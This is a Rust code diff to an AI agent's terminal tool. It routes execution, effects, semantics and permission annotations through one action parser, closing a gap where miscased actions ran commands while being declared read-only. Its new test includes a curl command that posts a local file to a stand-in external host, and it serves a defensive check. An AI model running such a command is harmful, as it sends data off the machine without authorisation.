@@ -6417,24 +6417,24 @@ impl TerminalTool {
             }
         }
 
-        let mut outcome = match args.action.as_str() {
-            "check" => {
+        let mut outcome = match TerminalAction::parse(&args.action) {
+            TerminalAction::Check => {
                 let pid = args
                     .pid
                     .ok_or_else(|| anyhow::anyhow!("pid is required for action=\"check\""))?;
                 self.handle_check(pid).await?
             }
-            "kill" => {
+            TerminalAction::Kill => {
                 let pid = args
                     .pid
                     .ok_or_else(|| anyhow::anyhow!("pid is required for action=\"kill\""))?;
                 self.handle_kill(pid).await?
             }
-            "trust_all" => {
+            TerminalAction::TrustAll => {
                 ToolCallOutcome::from_output(self.handle_trust_all(&args._session_id).await?)
             }
-            _ => {
-                // "run" or default
+            TerminalAction::Run | TerminalAction::Unrecognized => {
+                // "run", the default, or any other spelling
                 let command = args
                     .command
                     .as_deref()
@@ -6944,7 +6944,9 @@ impl TerminalTool {
         if outcome.metadata.exit_code.is_none() {
             outcome.metadata.exit_code = extract_terminal_exit_code(&outcome.output);
         }
-        if args.action == "run" && outcome.metadata.invocation_stage.reached_dispatch() {
+        if TerminalAction::parse(&args.action).runs_command()
+            && outcome.metadata.invocation_stage.reached_dispatch()
+        {
             outcome.metadata.access_enforcement = if run_is_confined(self.confinement) {
                 confined_process_access_enforcement()
             } else {
@@ -7239,10 +7241,10 @@ fn terminal_receipt_kind(arguments: &str) -> crate::traits::ToolReceiptKind {
             value
                 .get("action")
                 .and_then(Value::as_str)
-                .map(str::to_string)
+                .map(TerminalAction::parse)
         })
-        .unwrap_or_else(|| "run".to_string());
-    if action == "run" {
+        .unwrap_or(TerminalAction::Run);
+    if action.runs_command() {
         crate::traits::ToolReceiptKind::Process
     } else {
         crate::traits::ToolReceiptKind::Generic
@@ -7402,14 +7404,13 @@ fn terminal_call_semantics(arguments: &str) -> ToolCallSemantics {
         .as_ref()
         .and_then(|value| value.get("action"))
         .and_then(Value::as_str)
-        .map(|value| value.trim().to_ascii_lowercase())
-        .unwrap_or_else(|| "run".to_string());
-    match action.as_str() {
-        "check" => ToolCallSemantics::observation()
+        .map_or(TerminalAction::Run, TerminalAction::parse);
+    match action {
+        TerminalAction::Check => ToolCallSemantics::observation()
             .with_verification_mode(ToolVerificationMode::ResultContent),
-        "kill" => ToolCallSemantics::mutation(),
-        "trust_all" => ToolCallSemantics::administrative(),
-        _ => {
+        TerminalAction::Kill => ToolCallSemantics::mutation(),
+        TerminalAction::TrustAll => ToolCallSemantics::administrative(),
+        TerminalAction::Run | TerminalAction::Unrecognized => {
             let has_write_targets = args.as_ref().is_some_and(|value| {
                 ["write_paths", "write_roots"].into_iter().any(|field| {
                     value
@@ -7560,6 +7561,37 @@ fn validate_terminal_argument_contract(
     Ok(())
 }
 
+/// A terminal call's action, read once for execution, effects, semantics
+/// and annotations so they agree on every input. Only the exact schema
+/// spellings are recognized; execution runs anything else as `run` (its
+/// historical default), and effects declare such a call as unknown.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum TerminalAction {
+    Run,
+    Check,
+    Kill,
+    TrustAll,
+    /// Not an exact schema spelling (`"Check"`, `" run "`).
+    Unrecognized,
+}
+
+impl TerminalAction {
+    pub(crate) fn parse(action: &str) -> Self {
+        match action {
+            "run" => Self::Run,
+            "check" => Self::Check,
+            "kill" => Self::Kill,
+            "trust_all" => Self::TrustAll,
+            _ => Self::Unrecognized,
+        }
+    }
+
+    /// Execution runs the command or script.
+    pub(crate) fn runs_command(self) -> bool {
+        matches!(self, Self::Run | Self::Unrecognized)
+    }
+}
+
 /// The typed effects of a terminal call: `check` reads a tracked process,
 /// `run` declares what its command does (see
 /// `command_effects::shell_call_effects`), anything else is undeclared.
@@ -7579,9 +7611,9 @@ fn terminal_call_effects_on(arguments: &str, local: bool) -> aidaemon_core::Call
     let Ok(args) = serde_json::from_str::<TerminalArgs>(arguments) else {
         return aidaemon_core::CallEffects::unknown();
     };
-    match args.action.trim().to_ascii_lowercase().as_str() {
-        "check" => aidaemon_core::CallEffects::none(),
-        "run" => {
+    match TerminalAction::parse(&args.action) {
+        TerminalAction::Check => aidaemon_core::CallEffects::none(),
+        TerminalAction::Run => {
             let Some(text) = args
                 .command
                 .as_deref()
@@ -7612,8 +7644,11 @@ fn terminal_call_effects_on(arguments: &str, local: bool) -> aidaemon_core::Call
                 without_local_paths(effects)
             }
         }
-        // `kill` signals a process and `trust_all` changes a standing rule.
-        _ => aidaemon_core::CallEffects::unknown(),
+        // `kill` signals a process and `trust_all` changes a standing rule;
+        // a non-canonical spelling is executed as a run nobody declared.
+        TerminalAction::Kill | TerminalAction::TrustAll | TerminalAction::Unrecognized => {
+            aidaemon_core::CallEffects::unknown()
+        }
     }
 }
 
@@ -7763,15 +7798,18 @@ impl Tool for TerminalTool {
         let Ok(args) = serde_json::from_str::<TerminalArgs>(arguments) else {
             return aidaemon_core::ToolAnnotations::WRITE;
         };
-        match args.action.trim().to_ascii_lowercase().as_str() {
-            "check" => aidaemon_core::ToolAnnotations::READ_ONLY,
-            "kill" => aidaemon_core::ToolAnnotations::WRITE,
+        match TerminalAction::parse(&args.action) {
+            TerminalAction::Check => aidaemon_core::ToolAnnotations::READ_ONLY,
+            TerminalAction::Kill => aidaemon_core::ToolAnnotations::WRITE,
             // Changes a standing rule.
-            "trust_all" => aidaemon_core::ToolAnnotations {
+            TerminalAction::TrustAll => aidaemon_core::ToolAnnotations {
                 egress: true,
                 ..aidaemon_core::ToolAnnotations::WRITE
             },
-            _ => terminal_run_annotations(&args, self.confinement, roots),
+            // A non-canonical spelling executes as a run.
+            TerminalAction::Run | TerminalAction::Unrecognized => {
+                terminal_run_annotations(&args, self.confinement, roots)
+            }
         }
     }
 
@@ -7785,7 +7823,10 @@ impl Tool for TerminalTool {
         };
         // `check` and `kill` return a background process's output: it
         // carries the trust judged when that process was launched.
-        if matches!(args.action.trim(), "check" | "kill") {
+        if matches!(
+            TerminalAction::parse(&args.action),
+            TerminalAction::Check | TerminalAction::Kill
+        ) {
             return args
                 .pid
                 .and_then(|pid| {
@@ -13302,7 +13343,7 @@ mod call_effects_tests {
             assert!(!run(command).complete, "{command}");
         }
         let script = terminal_call_effects(
-            &serde_json::json!({"action": "run", "script": "ls\\nbash run.sh"}).to_string(),
+            &serde_json::json!({"action": "run", "script": "ls\nbash run.sh"}).to_string(),
         );
         assert!(!script.complete);
     }
@@ -13359,6 +13400,32 @@ mod call_effects_tests {
         let remote = terminal_call_effects_on(&arguments, false);
         assert!(!remote.complete);
         assert_eq!(remote.keys, vec![egress("h.example.invalid:443")]);
+    }
+
+    /// C2: effects and execution read the action through one parser; an
+    /// action execution would run but that is not spelled canonically is
+    /// undeclared rather than read as `check`.
+    #[test]
+    fn terminal_action_is_parsed_once() {
+        use super::TerminalAction;
+        for action in ["Check", " run ", "RUN", "check ", "Kill"] {
+            assert_eq!(TerminalAction::parse(action), TerminalAction::Unrecognized);
+            // Execution runs the command for these, as before.
+            assert!(TerminalAction::parse(action).runs_command(), "{action}");
+            let arguments = serde_json::json!({
+                "action": action,
+                "command": "curl -d @/tmp/x https://a.example.invalid/"
+            })
+            .to_string();
+            assert_eq!(
+                terminal_call_effects(&arguments),
+                CallEffects::unknown(),
+                "{action}"
+            );
+        }
+        assert_eq!(TerminalAction::parse("check"), TerminalAction::Check);
+        assert_eq!(TerminalAction::parse("run"), TerminalAction::Run);
+        assert!(!TerminalAction::parse("check").runs_command());
     }
 
     #[test]
